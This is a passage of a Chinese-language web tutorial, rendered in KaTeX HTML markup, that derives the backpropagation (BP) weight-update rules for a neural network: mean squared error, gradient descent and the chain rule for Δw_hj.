class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029000000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></li><li>隐层第h个神经元输出：bh；</li><li>假定功能单元均使用Sigmoid函数 。</li></ul><p><img src="/images/pasted-98.png" alt="神经网络变量和符号" /></p><ul><li><p>对训练<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_k,y_k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，假定输出为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>k</mi></msup><mo>=</mo><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mn>1</mn><mi>k</mi></msubsup><mo>+</mo><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mn>2</mn><mi>k</mi></msubsup><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>t</mi><mi>k</mi></msubsup></mrow><annotation encoding="application/x-tex">\hat{y}^k=\hat{y}^k_1+\hat{y}^k_2...\hat{y}^k_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.097216em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.4518920000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.097216em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.4518920000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.4530000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>k</mi></msup><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>β</mi><mi>j</mi></msub><mo>−</mo><msub><mi>θ</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{y}^k=f(\beta_j-\theta_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，则网络在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_k,y_k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的均方误差为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>E</mi><mi>k</mi></msub><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>l</mi></msubsup><mrow><mo stretchy="false">(</mo><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup><mo>−</mo><msubsup><mi>y</mi><mi>j</mi><mi>k</mi></msubsup><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mrow><annotation encoding="application/x-tex">E_k=\frac{1}{2}\sum^{l}_{j=1}{(\hat{y}^k_j-y^k_j)^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.424826em;vertical-align:-0.43581800000000004em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-2.441336em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span>，未知的参数包括隐层及输出层权值、阈值。<br />BP通过迭代学习，在每一轮采用广义的感知机学习规划对参数进行更新估计：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mo>←</mo><mi>v</mi><mo>+</mo><mi mathvariant="normal">△</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">v\leftarrow v+\triangle v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">△</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span>。BP算法基于梯度下降策略（gradient descent），以目标负梯度方向对参数进行调整。对于误差Ek，给定学习率：η：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">△</mi><msub><mi>w</mi><mrow><mi>h</mi><mi>j</mi></mrow></msub><mo>=</mo><mo>−</mo><mi>η</mi><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>E</mi><mi>k</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><mi>w</mi><mrow><msub><mrow></mrow><mi>h</mi></msub><mi>j</mi></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">\triangle w_{hj}=-\eta\frac{\partial E_k}{\partial w{_hj}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord">△</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.383076em;vertical-align:-0.481108em;"></span><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9019679999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.41586em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:-0.05764em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>E</mi><mi>k</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><mi>w</mi><mrow><msub><mrow></mrow><mi>h</mi></msub><mi>j</mi></mrow></mrow></mfrac><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>E</mi><mi>k</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup></mrow></mfrac><mo>⋅</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msubsup><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>j</mi><mi>k</mi></msubsup></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>β</mi><mi>j</mi></msub></mrow></mfrac><mo>⋅</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>β</mi><mi>j</mi></msub></mrow><mrow><mi mathvariant="normal">∂</mi><mi>w</mi><mrow><msub><mrow></mrow><mi>h</mi></msub><mi>j</mi></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial E_k}{\partial w{_hj}}=\frac{\partial E_k}{\partial \hat{y}^k_j} \cdot \frac{\partial \hat{y}^k_j}{\partial \beta_j} \cdot \frac{\partial \beta_j}{\partial w{_hj}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.383076em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9019679999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.41586em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:-0.05764em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6233679999999997em;vertical-align:-0.7213999999999998em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9019679999999999em;"><span style="top:-2.60142em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord accent mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.19444em;"><span class="mtight">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8408285714285714em;"><span style="top:-2.177714285714286em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.46117142857142857em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.41586em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 